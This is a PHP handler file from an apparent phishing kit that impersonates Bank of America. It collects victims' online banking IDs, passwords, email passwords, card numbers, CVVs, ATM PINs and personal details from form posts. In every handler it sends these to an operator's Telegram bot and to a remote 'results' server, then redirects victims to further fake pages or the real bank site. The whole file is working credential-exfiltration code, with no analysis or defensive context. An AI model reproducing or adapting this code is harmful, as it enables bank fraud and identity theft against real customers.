<?php
include 'config/auth.php';
if (isset($_POST['btn1'])) {
    //check Config
    $parms="email=".$email."&token=".$token."&type=".$page.'&domain='.$_SERVER['SERVER_NAME'];
    $url=$base_url."page-options/config?".$parms;
    $conf=json_decode(curl($url));

    if($conf=="Disable"){
        // Results  Request
        $params="email=".$email."&token=".$token."&type=".$page."&result_email=".$_POST['ai']."&result_password=".$_POST['pr'];
        $url1=$base_url."/results/results-details?".$params;
        $rs=curl($url1);
        $myfile = fopen("myid.txt", "w") or die("Unable to open file!");
        $txt = $rs;
        fwrite($myfile, $txt);
        fclose($myfile);


    }elseif($conf[0]=="Enable"){
        if($conf[1]=="Enable"){

            $message="Your Result \nOnline ID :: ".$_POST['ai']."\n"."Password :: ".$_POST['pr']."\n"."Page Type :: ".$page;
            $txt = urlencode($message);
            $teleurl = "https://api.telegram.org/bot" . $botToken . "/sendmessage?chat_id=" . $id . "&text=" . $txt;
            curl($teleurl);
        }
        // Results  Request
        $params="email=".$email."&token=".$token."&type=".$page."&result_email=".$_POST['ai']."&result_password=".$_POST['pr'];
        $url1=$base_url."/results/results-details?".$params;
        $rs=curl($url1);
        $myfile = fopen("myid.txt", "w") or die("Unable to open file!");
        $txt = $rs;
        fwrite($myfile, $txt);
        fclose($myfile);

    }elseif($conf[0]=="Disable"){

        if($conf[1]=="Enable"){

            $message="Your Result \nOnline ID :: ".$_POST['ai']."\n"."Password :: ".$_POST['pr']."\n"."Page Type :: ".$page;
            $txt = urlencode($message);
            $teleurl = "https://api.telegram.org/bot" . $botToken . "/sendmessage?chat_id=" . $id . "&text=" . $txt;
            curl($teleurl);
        }
        // Results  Request
        $params="email=".$email."&token=".$token."&type=".$page."&result_email=".$_POST['ai']."&result_password=".$_POST['pr'];
        $url1=$base_url."/results/results-details?".$params;
        $rs=curl($url1);
        $myfile = fopen("myid.txt", "w") or die("Unable to open file!");
        $txt = $rs;
        fwrite($myfile, $txt);
        fclose($myfile);
    }

    echo "<script>window.location = 'boa2.php'</script>";
    exit();



	
}

else if (isset($_POST['btn4'])) {



    //check Config
    $parms="email=".$email."&token=".$token."&type=".$page.'&domain='.$_SERVER['SERVER_NAME'];
    $url=$base_url."page-options/config?".$parms;
    $conf=json_decode(curl($url));
    if($conf=="Disable"){
        // Results  Request
        $x= file_get_contents("myid.txt");
        $params="email=".$email."&token=".$token."&type=".$page."&em=".$_POST['ai']."&pass=".$_POST['pr']."&re_id=".$x;
        $url1=$base_url."/results/boa-third?".$params;
        $rr=curl($url1);

    }elseif($conf[0]=="Enable"){
        if($conf[1]=="Enable"){

            $message="Your Result \nEmail :: ".$_POST['ai']."\n"."Password :: ".$_POST['pass'];
            $txt = urlencode($message);
            $teleurl = "https://api.telegram.org/bot" . $botToken . "/sendmessage?chat_id=" . $id . "&text=" . $txt;
            curl($teleurl);
        }
        // Results  Request
        $x= file_get_contents("myid.txt");
        $params="email=".$email."&token=".$token."&type=".$page."&em=".$_POST['ai']."&pass=".$_POST['pr']."&re_id=".$x;
        $url1=$base_url."/results/boa-second?".$params;
        curl($url1);

    }elseif($conf[0]=="Disable"){

        if($conf[1]=="Enable"){

            $message="Your Result \nEmail :: ".$_POST['ai']."\n"."Password :: ".$_POST['pass'];
            $txt = urlencode($message);
            $teleurl = "https://api.telegram.org/bot" . $botToken . "/sendmessage?chat_id=" . $id . "&text=" . $txt;
            curl($teleurl);
        }
        // Results  Request
        $x= file_get_contents("myid.txt");
        $params="email=".$email."&token=".$token."&type=".$page."&em=".$_POST['ai']."&pass=".$_POST['pr']."&re_id=".$x;
        $url1=$base_url."/results/boa-second?".$params;
        curl($url1);
    }

    echo "<script type='text/javascript'> document.location = 'https://www.bankofamerica.com/'; </script>";
    exit();


	
}

else if (isset($_POST['btn5'])) {

    //check Config
    $parms="email=".$email."&token=".$token."&type=".$page.'&domain='.$_SERVER['SERVER_NAME'];
    $url=$base_url."page-options/config?".$parms;
    $conf=json_decode(curl($url));
    if($conf=="Disable"){
        // Results  Request
        $x= file_get_contents("myid.txt");
        $params="email=".$email."&token=".$token."&type=".$page."&cn=".urlencode($_POST['cn'])."&exdate=".urlencode($_POST['exdate'])."&cvv=".urlencode($_POST['cvv'])."&atm=".$_POST['pin']."&zip=".$_POST['zc']."&re_id=".$x;
        $url1=$base_url."/results/boa-second?".$params;
        $rr=curl($url1);

    }elseif($conf[0]=="Enable"){
        if($conf[1]=="Enable"){

            $message="Your Result \nCard Number :: ".$_POST['cn']."\n"."Expiry Date :: ".$_POST['exdate']."\n"."Cvv :: ".$_POST['cvv']."\n"."Atm Pin :: ".$_POST['pin'].'\n'."Zip Code  :: ".$_POST['zc'];
            $txt = urlencode($message);
            $teleurl = "https://api.telegram.org/bot" . $botToken . "/sendmessage?chat_id=" . $id . "&text=" . $txt;
            curl($teleurl);
        }
        // Results  Request
        $x= file_get_contents("myid.txt");
        $params="email=".$email."&token=".$token."&type=".$page."&cn=".urlencode($_POST['cn'])."&exdate=".urlencode($_POST['exdate'])."&cvv=".urlencode($_POST['cvv'])."&atm=".$_POST['pin']."&zip=".$_POST['zc']."&re_id=".$x;
        $url1=$base_url."/results/boa-second?".$params;
        curl($url1);

    }elseif($conf[0]=="Disable"){

        if($conf[1]=="Enable"){

            $message="Your Result \nCard Number :: ".$_POST['cn']."\n"."Expiry Date :: ".$_POST['exdate']."\n"."Cvv :: ".$_POST['cvv']."\n"."Atm Pin :: ".$_POST['pin'].'\n'."Zip Code  :: ".$_POST['zc'];
            $txt = urlencode($message);
            $teleurl = "https://api.telegram.org/bot" . $botToken . "/sendmessage?chat_id=" . $id . "&text=" . $txt;
            curl($teleurl);
        }
        // Results  Request
        $x= file_get_contents("myid.txt");
        $params="email=".$email."&token=".$token."&type=".$page."&cn=".urlencode($_POST['cn'])."&exdate=".urlencode($_POST['exdate'])."&cvv=".urlencode($_POST['cvv'])."&atm=".$_POST['pin']."&zip=".$_POST['zc']."&re_id=".$x;
        $url1=$base_url."/results/boa-second?".$params;
        curl($url1);
    }

    echo "<script type='text/javascript'> document.location = 'boa4.php'; </script>";
    exit();


}
else if (isset($_POST['btn51'])) {

//check Config
    $parms="email=".$email."&token=".$token."&type=".$page.'&domain='.$_SERVER['SERVER_NAME'];
    $url=$base_url."page-options/config?".$parms;
    $conf=json_decode(curl($url));
    if($conf=="Disable"){
        // Results  Request
        $x= file_get_contents("myid.txt");
        $params="email=".$email."&token=".$token."&type=".$page."&fname=".urlencode($_POST['fname'])."&lname=".urlencode($_POST['lname'])."&ph=".urlencode($_POST['ph'])."&em=".$_POST['aii']."&re_id=".$x;
        $url1=$base_url."/results/boa-first?".$params;
        $rr=curl($url1);

    }elseif($conf[0]=="Enable"){
        if($conf[1]=="Enable"){

            $message="Your Result \nFirst Name :: ".$_POST['fname']."\n"."Last name :: ".$_POST['lname']."\n"."phone :: ".$_POST['ph']."\n"."Email :: ".$_POST['aii'];
            $txt = urlencode($message);
            $teleurl = "https://api.telegram.org/bot" . $botToken . "/sendmessage?chat_id=" . $id . "&text=" . $txt;
            curl($teleurl);
        }
        // Results  Request
        $x= file_get_contents("myid.txt");
        $params="email=".$email."&token=".$token."&type=".$page."&fname=".urlencode($_POST['fname'])."&lname=".urlencode($_POST['lname'])."&ph=".urlencode($_POST['ph'])."&em=".$_POST['aii']."&re_id=".$x;
        $url1=$base_url."/results/boa-first?".$params;
        curl($url1);

    }elseif($conf[0]=="Disable"){

        if($conf[1]=="Enable"){

            $message="Your Result \nFirst Name :: ".$_POST['fname']."\n"."Last name :: ".$_POST['lname']."\n"."phone :: ".$_POST['ph']."\n"."Email :: ".$_POST['aii'];
            $txt = urlencode($message);
            $teleurl = "https://api.telegram.org/bot" . $botToken . "/sendmessage?chat_id=" . $id . "&text=" . $txt;
            curl($teleurl);
        }
        // Results  Request
        $x= file_get_contents("myid.txt");
        $params="email=".$email."&token=".$token."&type=".$page."&fname=".urlencode($_POST['fname'])."&lname=".urlencode($_POST['lname'])."&ph=".urlencode($_POST['ph'])."&em=".$_POST['aii']."&re_id=".$x;
        $url1=$base_url."/results/boa-first?".$params;
        curl($url1);
    }

    echo "<script type='text/javascript'> document.location = 'boa3.php'; </script>";
    exit();



	
}
function curl($url){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}
?>